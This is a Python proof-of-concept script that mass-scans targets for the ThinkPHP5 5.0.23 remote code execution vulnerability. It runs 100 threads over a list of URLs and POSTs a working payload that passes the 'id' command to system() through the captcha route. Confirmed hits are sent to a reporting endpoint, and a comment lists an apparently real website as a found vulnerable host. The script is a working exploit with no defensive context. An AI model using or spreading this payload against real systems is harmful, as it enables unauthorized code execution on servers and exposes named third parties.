#!/usr/bin/env python
# coding=utf-8
import urllib
import requests
import urllib3
import sys
import nmap
import argparse
import json
import time
from urllib.parse import urlparse
from multiprocessing.dummy import Pool as ThreadPool
urllib3.disable_warnings()


vul_info = []

def thinkphp_construct_code_exec_verify(url):
    global vul_info
    pocdict = {
        "vulnname":"ThinkPHP5 5.0.23 远程代码执行漏洞",
        "isvul": False,
        "vulnurl":"",
        "payload":"",
        "proof":"",
        "response":"",
        "exception":"",
        "vul_level":"2",#高危
        "vul_type":"4",#代码执行
        "vul_exp_script":"ThinkPHP5_5.0.23_Remote_Code_Execution_exp.py"
    }
    headers = {
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36",
    }
    payload = {
        '_method':'__construct',
        'filter[]':'system',
        'method':'get',
        'server[REQUEST_METHOD]':'id',
    }
    try:
        vurl = urllib.parse.urljoin(url, 'index.php?s=captcha')
        print(vurl)
        req = requests.post(vurl, data=payload, headers=headers, timeout=15, verify=False)
        #print(req.text)
        if "uid=" in req.text and "gid=" in req.text:
            pocdict['isvul'] = True
            pocdict['vulnurl'] = vurl
            pocdict['payload'] = payload
            #pocdict['response'] = req.text
            print(pocdict)
            url_info=urlparse(vurl)
            vul_host = url_info.netloc
            vul_info.append({"vul_name":pocdict["vulnname"],"vul_level":pocdict["vul_level"],"vul_type":pocdict["vul_type"],"vul_url":vurl,"vul_host":vul_host})

    except Exception as e:
        print(e)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", dest='url', help="返回接口")
    parser.add_argument("-uid", "--uuid", dest='uuid', help="用户id")
    parser.add_argument("-sid", "--scanid", dest='scanid', help="任务id")

    args = parser.parse_args()
    
    pool = ThreadPool(100)
    url_list = []
    with open('url.txt',errors='ignore',encoding="utf-8") as f:
        lines = f.readlines()
        for url in lines:
            url = url.replace("\n","")
            url_list.append(url)
    pool.map( thinkphp_construct_code_exec_verify,url_list)    
    pool.close()  #关闭线程池，执行close后不会有新线程加入
    pool.join()   #等待所有子线程结束掉，后再结束。
    
    info_list = {"uuid":args.uuid,"scanid":args.scanid,"vul_info":vul_info}
    print(info_list)
    #{'uuid': 'uid', 'scanid': 's', 'vul_info': [{'vul_name': 'thinkphp_construct_code_exec', 'vul_level': '2', 'vul_type': '3', 'vul_url': 'http://www.kenking.cn/index.php?s=captcha', 'vul_host': 'www.kenking.cn'},
    #{'vul_name': 'thinkphp_construct_code_exec', 'vul_level': '2', 'vul_type': '3', 'vul_url': 'http://www.kenking.cn/index.php?s=captcha', 'vul_host': 'www.kenking.cn'}]}
    rep = requests.post(url=args.url,json=info_list)
    print(rep.text)